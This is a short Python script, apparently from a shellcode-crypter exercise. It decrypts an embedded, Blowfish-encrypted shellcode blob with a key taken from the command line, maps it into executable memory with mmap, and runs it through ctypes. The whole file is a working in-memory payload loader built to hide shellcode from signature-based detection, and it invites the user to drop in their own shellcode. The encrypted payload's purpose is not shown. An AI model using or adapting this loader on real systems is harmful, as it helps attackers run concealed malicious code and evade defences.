#!/usr/bin/env python

#Importing all the important libraries including the ones for execution

from Crypto.Cipher import Blowfish
from Crypto import Random
from struct import pack
from ctypes import c_int64, c_int, CFUNCTYPE, addressof
import mmap
import sys

#put your shellcode here

shellcode=("\x83\x4b\x6d\xc3\x78\x78\x2a\x96\x8a\x75\x62\xdf\x9a\x3f\xef\x83\x43\x48\x7a\xf6\xc9\x03\x72\x6c\x75\x4b\x29\x79\x92\x3d\x77\xe0\x06\x14\x6f\xde\x8b\xf4\xd9\x7a\x3c\xde\x30\x67\xa2\x54\xaf\xc9\xf4\x42\xed\xa8\x91\xf2\x8b\x7f")

#normal decryption the oposite of encryption as taken from: https://www.dlitz.net/software/pycrypto/api/current/Crypto.Cipher.Blowfish-module.html

bs = Blowfish.block_size
key = sys.argv[1] 
iv = shellcode[:8] 
cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv)
shell = cipher.decrypt(shellcode[8:])


#Here we map some memory space an put our shellcode in it
mm = mmap.mmap(-1, len(shell), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
mm.write(shell)

#here we actually execute our shellcode in memory
restype = c_int64
argtypes = tuple()
ctypes_buffer = c_int.from_buffer(mm)
function = CFUNCTYPE(restype, *argtypes)(addressof(ctypes_buffer))
function()

